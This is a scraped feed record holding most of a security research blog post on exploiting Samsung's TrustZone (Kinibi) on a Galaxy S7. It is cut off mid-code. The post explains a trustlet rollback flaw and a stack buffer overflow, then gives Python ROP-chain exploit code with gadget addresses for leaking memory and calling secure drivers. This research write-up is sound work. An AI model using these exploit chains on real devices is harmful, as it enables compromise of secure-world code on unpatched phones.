href=\"https://www.commoncriteriaportal.org/files/epfiles/certification-report-nscib-cc-180212-cr2.pdf\">https://www.commoncriteriaportal.org/files/epfiles/certification-report-nscib-cc-180212-cr2.pdf</a></td> \n   </tr> \n  </tbody> \n </table> \n</div>","descriptionType":"html","publishedDate":"Mon, 11 May 2020 22:00:00 +0000","feedId":11110,"bgimg":"http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/iso7816.png","linkMd5":"45d86b363b28f0fc661f9ac9a1472981","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx/cdn40@2020_3/2020/08/25/01-15-08-534_95d64cc484216a5b.webp","destWidth":367,"destHeight":243,"sourceBytes":24571,"destBytes":7944,"author":"Philippe Teuwen","articleImgCdnMap":{"http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/iso7816.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn40@2020_3/2020/08/25/01-15-08-534_95d64cc484216a5b.webp","http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/instrumented_reader_1024.jpg":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn50@2020_5/2020/08/25/01-15-16-102_0ccd0b847fa016cb.webp","http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/instrumented_reader2_1024.jpg":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn73@2020_3/2020/08/25/01-15-15-710_3b7e18561792854c.webp","http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/capture.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn16@2020_5/2020/08/25/01-15-15-708_799c011110a32d17.webp"},"publishedOrCreatedDate":1598318092716},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"A Deep Dive Into Samsung's TrustZone (Part 3)","link":"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html","description":"<script src=\"resources/2019-12-10-samsung_trustzone_exploitation_part2/asciinema-player.js\"></script> \n<link rel=\"stylesheet\" href=\"resources/2019-12-10-samsung_trustzone_exploitation_part2/asciinema-player.css\" /> \n<style> img { border: none; border-radius: 0px; padding: 4px; margin: 1em 1em 1em 0; box-shadow: none; max-width: 100%; max-height: 450px; width:auto; height: auto; } .align-center { margin-top: 20px; margin-bottom: 20px; } </style> \n<ul class=\"simple\"> \n <li><a class=\"reference external\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html\">Part 1</a>: Detailed overview of Samsung's TrustZone components</li> \n <li><a class=\"reference external\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-2.html\">Part 2</a>: Tools development for reverse-engineering and vulnerability research</li> \n <li>Part 3: Vulnerability exploitation to reach code execution in EL3 on a Samsung device</li> \n</ul> \n<div class=\"section\" id=\"introduction\"> \n <h2>Introduction</h2> \n <p>This article details different vulnerabilities affecting Secure World components in Samsung's TrustZone and how to exploit them to achieve code execution in EL3, the highest privilege on an ARM device. However, this is not a full-chain exploit and it is assumed that the attacker managed to get code execution with enough privileges to use the Normal World driver communicating with the Secure World. In practice, the attacker needs at least the privileges from the Android <tt class=\"docutils literal\">radio</tt> group.</p> \n <p>The exploitation of these vulnerabilities was performed on a Samsung Galaxy S7 running a stock version of Android 8.0.0 (PDA version: <tt class=\"docutils literal\">G930FXXS5ESF8</tt> <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#sammobile\" id=\"id1\">[SAMMOBILE]</a>). While this version might seem obsolete, little has changed between TrustZone versions since then and the exploitation process on a Galaxy S9 remains the same.</p> \n</div> \n<div class=\"section\" id=\"revocation-issues\"> \n <h2>Revocation Issues</h2> \n <p>All the vulnerabilities detailed in this article have been patched. However, a few years ago, Gal Beniamini presented a design flaw in a blog post called <em>Trust Issues: Exploiting TrustZone TEEs</em> <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-3.html#trust-issues\" id=\"id2\">[TRUST_ISSUES]</a> that allowed him to load older versions of trustlets that were vulnerable. In other words, if a trustlet was vulnerable and a newer version was released to patch this vulnerability, it was still possible to load the vulnerable version instead and continue to exploit the vulnerability on the device.</p> \n <p>This can be prevented by an anti-rollback mechanism to revoke older versions of a trustlet. The issue has been addressed by Trustonic in the version 400 of Kinibi, by implementing a protection based on the MCLF <em>Version Count</em> field.</p> \n <p>However, some trustlets that are supposed to be revoked on certain Samsung devices (e.g. Galaxy S7/S8/S9, etc.) can still be loaded and run in the Secure World. Comparing the <em>Version Count</em> field of the older and newer version of the trustlet shows that they are both equal to 0. It can be assumed that, while the revocation mechanism is available, it is not being used for all components yet. By abusing this revocation issue, an attacker can simply load an older vulnerable trustlet on the upstream version of any Samsung Galaxy device shipped with Kinibi in order to exploit the flaw and gain code execution in S-EL0.</p> \n <p>This design flaw is leveraged in the attack described in this article to exploit vulnerable versions of trustlets and secure drivers.</p> \n</div> \n<div class=\"section\" id=\"getting-code-execution-in-a-trusted-application\"> \n <span id=\"sec-trustlet-exploitation\"></span> \n <h2>Getting Code Execution in a Trusted Application</h2> \n <div class=\"section\" id=\"trustlet-vulnerability-analysis\"> \n  <h3>Trustlet - Vulnerability Analysis</h3> \n  <p>Our journey to EL3 first starts in S-EL0, the Secure World userland, where a regular trusted application will be exploited. Using an application running in the Normal World with the necessary privileges, the memory shared between the two worlds will be used to send commands and data to the targeted trustlet.</p> \n  <p>The vulnerable trustlet used here is called, according to the log strings, <tt class=\"docutils literal\">SEM</tt>. Little is known about its actual use in Samsung's TrustZone, except that it performs cryptographic operations. But understanding it was not necessary to find vulnerabilities in it.</p> \n  <p>The binary for this trusted application is from an older OTA and can be downloaded here: <a class=\"reference external\" href=\"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/fffffffff0000000000000000000001b.tlbin\">fffffffff0000000000000000000001b.tlbin</a>.</p> \n  <ul class=\"simple\"> \n   <li><strong>Trustlet ID:</strong> <tt class=\"docutils literal\">fffffffff0000000000000000000001b</tt></li> \n   <li><strong>MD5:</strong> <tt class=\"docutils literal\">96b5bf2a4524328f64120538e900699a</tt></li> \n  </ul> \n  <p>One of the vulnerabilities identified in the trustlet during this study was a simple buffer overflow in a command handler called <tt class=\"docutils literal\">unwrapSEMServiceKey</tt>. This handler can be found at address <tt class=\"docutils literal\">0x20D08</tt> and is reachable using the command IDs <tt class=\"docutils literal\">1</tt> and <tt class=\"docutils literal\">7</tt>. <tt class=\"docutils literal\">unwrapSEMServiceKey</tt> then calls <tt class=\"docutils literal\">parseSEMServiceKey</tt>, located at address <tt class=\"docutils literal\">0x20B76</tt>, which is the vulnerable function.</p> \n  <p>The arguments passed to <tt class=\"docutils literal\">parseSEMServiceKey</tt> are described below and can be traced from the entry point of the trustlet:</p> \n  <ul class=\"simple\"> \n   <li><strong>First argument (R0):</strong> the TCI buffer address, as input buffer.</li> \n   <li><strong>Second argument (R1):</strong> the TCI buffer address, as output buffer.</li> \n  </ul> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"mh\">0x20B76</span><span class=\"o\">:</span>    <span class=\"n\">PUSH</span><span class=\"p\">.</span><span class=\"n\">W</span>    <span class=\"p\">{</span><span class=\"n\">R4</span><span class=\"o\">-</span><span class=\"n\">R8</span><span class=\"p\">,</span><span class=\"n\">LR</span><span class=\"p\">}</span>\n<span class=\"mh\">0x20B7A</span><span class=\"o\">:</span>    <span class=\"n\">MOV</span>       <span class=\"n\">R4</span><span class=\"p\">,</span> <span class=\"n\">R1</span>\n<span class=\"mh\">0x20B7C</span><span class=\"o\">:</span>    <span class=\"n\">SUB</span><span class=\"p\">.</span><span class=\"n\">W</span>     <span class=\"n\">SP</span><span class=\"p\">,</span> <span class=\"n\">SP</span><span class=\"p\">,</span> <span class=\"err\">#</span><span class=\"mh\">0x11C0</span>\n<span class=\"mh\">0x20B80</span><span class=\"o\">:</span>    <span class=\"n\">MOV</span>       <span class=\"n\">R5</span><span class=\"p\">,</span> <span class=\"n\">R0</span>\n<span class=\"mh\">0x20B82</span><span class=\"o\">:</span>    <span class=\"n\">ADD</span>       <span class=\"n\">R7</span><span class=\"p\">,</span> <span class=\"n\">SP</span><span class=\"p\">,</span> <span class=\"err\">#</span><span class=\"mi\">8</span>\n<span class=\"mh\">0x20B84</span><span class=\"o\">:</span>    <span class=\"n\">MOVW</span>      <span class=\"n\">R1</span><span class=\"p\">,</span> <span class=\"err\">#</span><span class=\"mh\">0xDAC</span>\n<span class=\"mh\">0x20B88</span><span class=\"o\">:</span>    <span class=\"n\">MOV</span>       <span class=\"n\">R6</span><span class=\"p\">,</span> <span class=\"n\">R7</span>\n<span class=\"mh\">0x20B8A</span><span class=\"o\">:</span>    <span class=\"n\">MOV</span>       <span class=\"n\">R0</span><span class=\"p\">,</span> <span class=\"n\">R6</span>\n<span class=\"mh\">0x20B8C</span><span class=\"o\">:</span>    <span class=\"n\">BL</span>        <span class=\"n\">bzero</span>\n<span class=\"mh\">0x20B90</span><span class=\"o\">:</span>    <span class=\"n\">LDR</span>       <span class=\"n\">R0</span><span class=\"p\">,</span> <span class=\"o\">=</span><span class=\"mh\">0x16808</span>\n<span class=\"mh\">0x20B92</span><span class=\"o\">:</span>    <span class=\"n\">ADD</span><span class=\"p\">.</span><span class=\"n\">W</span>     <span class=\"n\">R1</span><span class=\"p\">,</span> <span class=\"n\">R5</span><span class=\"p\">,</span> <span class=\"err\">#</span><span class=\"mi\">8</span>    <span class=\"p\">;</span> <span class=\"n\">R1</span> <span class=\"o\">&lt;-</span> <span class=\"n\">src</span> <span class=\"o\">=</span> <span class=\"n\">tci_buffer_addr</span><span class=\"o\">+</span><span class=\"mh\">0x8</span>\n<span class=\"mh\">0x20B96</span><span class=\"o\">:</span>    <span class=\"n\">LDR</span>       <span class=\"n\">R2</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"n\">R0</span><span class=\"p\">,</span><span class=\"n\">R5</span><span class=\"p\">]</span>   <span class=\"p\">;</span> <span class=\"n\">R2</span> <span class=\"o\">&lt;-</span> <span class=\"n\">len</span> <span class=\"o\">=</span> <span class=\"o\">*</span><span class=\"p\">(</span><span class=\"n\">tci_buffer_addr</span><span class=\"o\">+</span><span class=\"mh\">0x16808</span><span class=\"p\">)</span>\n<span class=\"mh\">0x20B98</span><span class=\"o\">:</span>    <span class=\"n\">MOV</span>       <span class=\"n\">R0</span><span class=\"p\">,</span> <span class=\"n\">R6</span>        <span class=\"p\">;</span> <span class=\"n\">R0</span> <span class=\"o\">&lt;-</span> <span class=\"n\">dst</span> <span class=\"o\">=</span> <span class=\"n\">SP</span> <span class=\"o\">+</span> <span class=\"mh\">0x8</span>\n<span class=\"mh\">0x20B9A</span><span class=\"o\">:</span>    <span class=\"n\">STR</span>       <span class=\"n\">R2</span><span class=\"p\">,</span> <span class=\"p\">[</span><span class=\"n\">SP</span><span class=\"p\">,</span><span class=\"err\">#</span><span class=\"mh\">0x11C0</span><span class=\"o\">+</span><span class=\"n\">var_11BC</span><span class=\"p\">]</span>\n<span class=\"mh\">0x20B9C</span><span class=\"o\">:</span>    <span class=\"n\">BLX</span>       <span class=\"n\">memcpy</span>\n</pre> \n  </div> \n  <p>As shown in the assembly above, the function retrieves its arguments, then calls <tt class=\"docutils literal\">bzero</tt> followed by <tt class=\"docutils literal\">memcpy</tt>. The arguments of <tt class=\"docutils literal\">memcpy</tt> are the following:</p> \n  <ul class=\"simple\"> \n   <li><strong>First argument (R0):</strong> the output buffer, an address from the stack.</li> \n   <li><strong>Second argument (R1):</strong> the input buffer, taken from the TCI buffer, and therefore user-controlled, at the offset <tt class=\"docutils literal\">0x08</tt>.</li> \n   <li><strong>Third argument (R2):</strong> the buffer length, taken from the TCI buffer, and therefore user-controlled, at the offset <tt class=\"docutils literal\">0x16808</tt>.</li> \n  </ul> \n  <p>User-controlled data of user-controlled length are arbitrarily copied into the stack of the trustlet, leading to a textbook buffer overflow. The state of the stack after the call to <tt class=\"docutils literal\">memcpy</tt> is given below. It highlights that specifying a length greater than <tt class=\"docutils literal\">0x11CC</tt> in the TCI buffer at the offset <tt class=\"docutils literal\">0x16808</tt> will lead to the corruption of the link register and, therefore, of the execution flow of the trustlet.</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/trustlet_vuln_memcpy_s7.png\" style=\"width: 407.55px; height: 385.55px;\" /> \n  <p>The only software mitigations implemented in Samsung's TrustZone are canaries, which are rarely used on older Galaxy devices (S6/S7), and the <em>eXecute Never</em> (XN) bit. For this trustlet, only the XN bit is present, which means the stack is not executable and requires the use of <a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Return-oriented_programming\">Return Oriented Programming</a> (<em>ROP</em>).</p> \n  <p>Now that it is theoretically possible to get code execution in S-EL0, the next objective is to pivot to a higher privileged target since S-EL0 remains pretty limited. In our case, the chosen target is a secure driver. While they also run at S-EL0, secure drivers are given more privileges by Kinibi and thus have access to more syscalls and can perform actions such as mapping physical memory, start threads, etc.</p> \n </div> \n <div class=\"section\" id=\"trustlet-exploitation\"> \n  <h3>Trustlet - Exploitation</h3> \n  <div class=\"section\" id=\"secure-world-state-and-memory-layout\"> \n   <h4>Secure World State and Memory Layout</h4> \n   <p>The real difficulty lies in getting information about the state and memory layout of the trustlet since the only interfaces available to us are system logs and the TCI buffer. Forging our ROP chain and obtaining code execution requires some information about the Secure World state beforehand.</p> \n   <p>Gadgets can be found in:</p> \n   <ul class=\"simple\"> \n    <li>the trustlet <tt class=\"docutils literal\">.text</tt> section loaded at address <tt class=\"docutils literal\">0x1000</tt>;</li> \n    <li>the McLib loaded at address <tt class=\"docutils literal\">0x7d01000</tt>.</li> \n   </ul> \n   <p>To send and receive data, the main communication channel is the TCI buffer, which is always loaded at address <tt class=\"docutils literal\">0x100000</tt> in a trustlet.</p> \n   <p>Thanks to the lack of ASLR, these addresses do not change between executions, making it easier to write the exploit, which would otherwise require an information leak primitive.</p> \n   <p>Now, writing an exploit is only a matter of finding the right gadgets (using tools such as ropper or ROPGadget) and crafting the adequate TCI buffer.</p> \n  </div> \n  <div class=\"section\" id=\"exploit-architecture\"> \n   <h4>Exploit Architecture</h4> \n   <p>All the exploits presented in this blog post use our Python bindings <tt class=\"docutils literal\">pymcclient</tt> introduced in a <a class=\"reference external\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-2.html\">previous article</a> and are based on the same architecture.</p> \n   <p>The main function instantiates a specific interface to communicate with a trustlet, a secure driver, etc. For example, <tt class=\"docutils literal\">TrustletInterface</tt> is used when exploiting a trustlet and <tt class=\"docutils literal\">SecDriverInterface</tt> for a secure driver.</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"k\">with</span> <span class=\"n\">TrustletInterface</span><span class=\"p\">()</span> <span class=\"k\">as</span> <span class=\"n\">tl_if</span><span class=\"p\">:</span>\n    <span class=\"k\">with</span> <span class=\"n\">SecDriverInterface</span><span class=\"p\">(</span><span class=\"n\">tl_if</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">dr_if</span><span class=\"p\">:</span>\n        <span class=\"c1\"># do stuff</span>\n</pre> \n   </div> \n   <p>The same interfaces provide a method to execute code in the targeted component by exploiting the vulnerabilities described in this post. By using this method, and providing the payload they want to execute, the attacker is able to run arbitrary code in the targeted Secure World component.</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"k\">with</span> <span class=\"n\">TrustletInterface</span><span class=\"p\">()</span> <span class=\"k\">as</span> <span class=\"n\">tl_if</span><span class=\"p\">:</span>\n    <span class=\"n\">tl_if</span><span class=\"o\">.</span><span class=\"n\">buffer_overflow_exploit</span><span class=\"p\">(</span>\n        <span class=\"c1\"># Variadic payloads</span>\n    <span class=\"p\">)</span>\n</pre> \n   </div> \n   <p>Payloads are just static functions returning a list of gadgets to write in the stack frame of the targeted component. A ropchain to leak an arbitrary dword in memory is given below.</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"k\">class</span> <span class=\"nc\">TrustletPayload</span><span class=\"p\">(</span><span class=\"nb\">object</span><span class=\"p\">):</span>\n\n    <span class=\"nd\">@staticmethod</span>\n    <span class=\"k\">def</span> <span class=\"nf\">read_dword</span><span class=\"p\">(</span><span class=\"n\">address_to_leak</span><span class=\"p\">,</span> <span class=\"n\">output_address</span><span class=\"p\">):</span>\n        <span class=\"sd\">\"\"\"</span>\n<span class=\"sd\">        Function reading a dword in memory at the address `address_to_leak`</span>\n<span class=\"sd\">        and writing it into `output_address`.</span>\n<span class=\"sd\">        \"\"\"</span>\n        <span class=\"n\">ropchain</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n\n        <span class=\"c1\"># Return address</span>\n        <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0x07d07661</span><span class=\"p\">]</span>\n\n        <span class=\"c1\"># 0x07d07660 (0x07d07661): pop {r1, r2, r3, r4, r5, pc};</span>\n        <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"n\">address_to_leak</span> <span class=\"o\">-</span> <span class=\"mi\">4</span><span class=\"p\">]</span>\n        <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0xdeadbeef</span><span class=\"p\">]</span>\n        <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0xdeadbeef</span><span class=\"p\">]</span>\n        <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"n\">output_address</span><span class=\"p\">]</span>\n        <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0xdeadbeef</span><span class=\"p\">]</span>\n        <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0x07d0940f</span><span class=\"p\">]</span>\n\n        <span class=\"c1\"># 0x07d0940e (0x07d0940f): ldr r0, [r1, #4]; pop {pc};</span>\n        <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0x07d0244d</span><span class=\"p\">]</span>\n\n        <span class=\"c1\"># 0x07d0244c (0x07d0244d): str r0, [r4]; pop {r4, pc};</span>\n        <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0x2079D</span><span class=\"p\">]</span>\n\n        <span class=\"k\">return</span> <span class=\"n\">ropchain</span>\n</pre> \n   </div> \n   <p>Most of these payloads don't specify the last value of <tt class=\"docutils literal\">pc</tt> in order to be able to chain payloads together. Only the last payload in the list of arguments passed to the code execution method requires it. In the case of the <tt class=\"docutils literal\">TrustletInterface</tt>, for example, this terminating payload is <tt class=\"docutils literal\">call_notify_and_wait</tt>.</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"nd\">@staticmethod</span>\n<span class=\"k\">def</span> <span class=\"nf\">call_notify_and_wait</span><span class=\"p\">():</span>\n    <span class=\"sd\">\"\"\"</span>\n<span class=\"sd\">    Notifies the Normal World with `tlApiNotify` and calls</span>\n<span class=\"sd\">    `tlApiWaitNotification` with the correct `timeout=0xffffffff`</span>\n<span class=\"sd\">    Also resets `R4` to the TCI buffer address</span>\n<span class=\"sd\">    \"\"\"</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0x0001f581</span><span class=\"p\">]</span>\n\n    <span class=\"c1\"># 0x0001f580 (0x0001f581): pop {r4, r5, r6, pc};</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"n\">TCI_TL_BUFFER_ADDRESS</span><span class=\"p\">]</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0xffffffff</span><span class=\"p\">]</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0xdeadbeef</span><span class=\"p\">]</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0x207C1</span><span class=\"p\">]</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">ropchain</span>\n</pre> \n   </div> \n   <p>Now, the previous snippets of code can be used together to leak an arbitrary dword of the exploited trustlet address space.</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"n\">tl_output_length</span> <span class=\"o\">=</span> <span class=\"mh\">0x100</span>\n<span class=\"n\">tl_output_offset</span> <span class=\"o\">=</span> <span class=\"mh\">0x80</span>\n<span class=\"n\">tl_output_addr</span> <span class=\"o\">=</span> <span class=\"n\">TCI_BUFFER_ADDRESS</span> <span class=\"o\">+</span> <span class=\"n\">tl_output_offset</span>\n<span class=\"n\">address_to_leak</span> <span class=\"o\">=</span> <span class=\"mh\">0x108c</span>\n<span class=\"n\">leaked_dword</span> <span class=\"o\">=</span> <span class=\"bp\">None</span>\n\n<span class=\"k\">with</span> <span class=\"n\">TrustletInterface</span><span class=\"p\">()</span> <span class=\"k\">as</span> <span class=\"n\">tl_if</span><span class=\"p\">:</span>\n    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s2\">\"[+] Starting the buffer overflow exploit\"</span><span class=\"p\">)</span>\n    <span class=\"n\">tl_if</span><span class=\"o\">.</span><span class=\"n\">buffer_overflow_exploit</span><span class=\"p\">(</span>\n        <span class=\"n\">RopChain</span><span class=\"o\">.</span><span class=\"n\">read_dword</span><span class=\"p\">(</span><span class=\"n\">address_to_leak</span><span class=\"p\">,</span> <span class=\"n\">tl_output_addr</span><span class=\"p\">),</span>\n        <span class=\"n\">RopChain</span><span class=\"o\">.</span><span class=\"n\">call_notify_and_wait</span><span class=\"p\">(),</span>\n    <span class=\"p\">)</span>\n    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s2\">\"[+] Exploit completed\"</span><span class=\"p\">)</span>\n\n    <span class=\"n\">tl_if</span><span class=\"o\">.</span><span class=\"n\">tci</span><span class=\"o\">.</span><span class=\"n\">seek</span><span class=\"p\">(</span><span class=\"n\">tl_output_offset</span><span class=\"p\">)</span>\n    <span class=\"n\">leaked_dword</span> <span class=\"o\">=</span> <span class=\"n\">tl_if</span><span class=\"o\">.</span><span class=\"n\">tci</span><span class=\"o\">.</span><span class=\"n\">read_dword</span><span class=\"p\">()</span>\n\n<span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s2\">\"[+] Value at 0x{:08x} = 0x{:08x}\"</span>\n      <span class=\"o\">.</span><span class=\"n\">format</span><span class=\"p\">(</span><span class=\"n\">address_to_leak</span><span class=\"p\">,</span> <span class=\"n\">leaked_dword</span><span class=\"p\">))</span>\n</pre> \n   </div> \n   <p>The whole exploit can be found here: <a class=\"reference external\" href=\"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/exploits/trustlet.py\">trustlet.py</a>.</p> \n  </div> \n  <div class=\"section\" id=\"communication-between-trustlets-and-secure-drivers\"> \n   <h4>Communication Between Trustlets and Secure Drivers</h4> \n   <p>Now that code execution is possible in a trustlet, the next step is to pivot to a secure driver to elevate our privileges. The <a class=\"reference external\" href=\"http://blog.quarkslab.com/a-deep-dive-into-samsungs-trustzone-part-1.html\">first blog post</a> in this series pointed out that the communication between a trustlet and a secure driver is made using an <em>Inter-Process Communication</em> (IPC) mechanism. This section details how to send data to a secure driver, in practice, using the vulnerability in the trustlet discussed above.</p> \n   <p>IPCs are a client/server model, where a trustlet is identified as a client and a secure driver as a server. Secure drivers use <tt class=\"docutils literal\">drApiIpcCallToIPCH</tt> to wait for IPC messages to be received. In regards to trustlets, two functions exist depending on the API level implemented:</p> \n   <ul class=\"simple\"> \n    <li><tt class=\"docutils literal\">tlApi_CallDriver</tt>, the older one;</li> \n    <li><tt class=\"docutils literal\">tlApi_CallDriverEx</tt>, the newest one.</li> \n   </ul> \n   <p>Both of these functions are used to send IPC messages to secure drivers, however they differ in their prototype.</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"n\">tlApiResult_t</span> <span class=\"nf\">tlApi_callDriver</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span> <span class=\"n\">driver_ID</span><span class=\"p\">,</span> <span class=\"kt\">void</span><span class=\"o\">*</span> <span class=\"n\">pMarParam</span><span class=\"p\">);</span>\n<span class=\"n\">tlApiResult_t</span> <span class=\"nf\">tlApi_callDriverEx</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span> <span class=\"n\">driver_ID</span><span class=\"p\">,</span> <span class=\"kt\">void</span><span class=\"o\">*</span> <span class=\"n\">pMarParam</span><span class=\"p\">,</span> <span class=\"kt\">uint32_t</span> <span class=\"n\">payloadSize</span><span class=\"p\">);</span>\n</pre> \n   </div> \n   <p>The new tlApi appeared during the publication of the Trustonic API level 5, and is mainly due to an internal rework of how secure drivers access data within a trustlet.</p> \n   <p>Before API level 5, a client could send a request to a driver with the <tt class=\"docutils literal\">tlApi_callDriver</tt> function. The secure driver would then map the entire memory of the trustlet (i.e. code, data, bss, TCI buffer) within its address space using the function <tt class=\"docutils literal\">drApiMapClientAndParams</tt>. This function would then translate the payload address given as argument from the trustlet address space to the driver address space.</p> \n   <p>Starting from API level 5, Trustonic chose to harden their API by introducing the <tt class=\"docutils literal\">tlApi_callDriverEx</tt> function, which now takes the payload length as a third parameter. This parameter can be passed to a new function called <tt class=\"docutils literal\">drApiMapTaskBuffer</tt>, allowing the secure driver to map only the payload buffer from the trustlet address space into its own address space.</p> \n   <p>At this point, two steps are required to be able to communicate with a secure driver.</p> \n   <ol class=\"arabic simple\"> \n    <li>determining which function to use between <tt class=\"docutils literal\">tlApi_CallDriver</tt> and <tt class=\"docutils literal\">tlApi_CallDriver</tt>; here the trustlet was compiled for an API version above 5, while the secure driver was compiled for an API version below; in practice, it means that the attacker needs to craft its own tlApi call; it can be done fairly easily, but it's something to keep in mind when doing exploitation;</li> \n    <li>crafting the IPC structure passed as the second argument of <tt class=\"docutils literal\">tlApi_CallDriver</tt>; the format of this structure is given below; the pointer to <tt class=\"docutils literal\">data</tt> can reference memory in the TCI buffer; it means that it is possible to craft this structure directly from the Normal World and construct a ropchain calling <tt class=\"docutils literal\">tlApi_CallDriver</tt> which references the structure stored in the TCI buffer.</li> \n   </ol> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"k\">typedef</span> <span class=\"k\">struct</span> <span class=\"p\">{</span>\n    <span class=\"kt\">uint32_t</span> <span class=\"n\">functionId</span><span class=\"p\">;</span>\n    <span class=\"kt\">void</span><span class=\"o\">*</span>  <span class=\"n\">data</span><span class=\"p\">;</span>\n<span class=\"p\">}</span> <span class=\"n\">drMarshalledParam_t</span><span class=\"p\">;</span>\n</pre> \n   </div> \n   <p>A detailed picture of the structure can be found in the figure below.</p> \n   <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-06-30-samsung_trustzone_exploitation-part3/trustlet_exploit_calldriver_s7.png\" style=\"width: 297.0px; height: 189.9px;\" /> \n   <p>Now that the plan is laid out, let's continue onto the implementation. The first ropchain, created by the method <tt class=\"docutils literal\">call_driver</tt> given below, prepares the arguments for the tlApi handler that will effectively call <tt class=\"docutils literal\">tlApi_CallDriver</tt>, as well as the arguments for <tt class=\"docutils literal\">tlApi_CallDriver</tt> itself.</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"nd\">@staticmethod</span>\n<span class=\"k\">def</span> <span class=\"nf\">call_driver</span><span class=\"p\">(</span><span class=\"n\">driver_id</span><span class=\"p\">,</span> <span class=\"n\">payload_address</span><span class=\"p\">,</span> <span class=\"n\">retval_address</span><span class=\"p\">,</span> <span class=\"n\">tlapi_handler</span><span class=\"p\">):</span>\n    <span class=\"sd\">\"\"\"</span>\n<span class=\"sd\">    Function calling tlApi_callDriver using directly the tlApi handler</span>\n<span class=\"sd\">    address. The arguments passed to the handler are:</span>\n<span class=\"sd\">        - R0: the ID of tlApi_callDriver, which is 0x8</span>\n<span class=\"sd\">        - R1: the driver ID</span>\n<span class=\"sd\">        - R2: a pointer to the data that will be processed by the</span>\n<span class=\"sd\">              secure driver</span>\n<span class=\"sd\">    \"\"\"</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n    <span class=\"n\">tlApi_callDriver_id</span> <span class=\"o\">=</span> <span class=\"mh\">0x8</span> <span class=\"c1\"># ID of tlApi_callDriver</span>\n\n    <span class=\"c1\"># Return address</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0x07d069e5</span><span class=\"p\">]</span>\n\n    <span class=\"c1\"># 0x07d069e4 (0x07d069e5): pop {r0, r1, r2, r3, pc};</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"n\">tlapi_handler</span><span class=\"p\">]</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0xdeadbeef</span><span class=\"p\">]</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0xdeadbeef</span><span class=\"p\">]</span>\n    <span class=\"n\">ropchain</span> <span class=\"o\">+=</span> <span class=\"p\">[</span><span class=\"mh\">0xdeadbeef</span><span class=\"p\">]</span>\n    <span class=\"n\">ropchain</span> <span 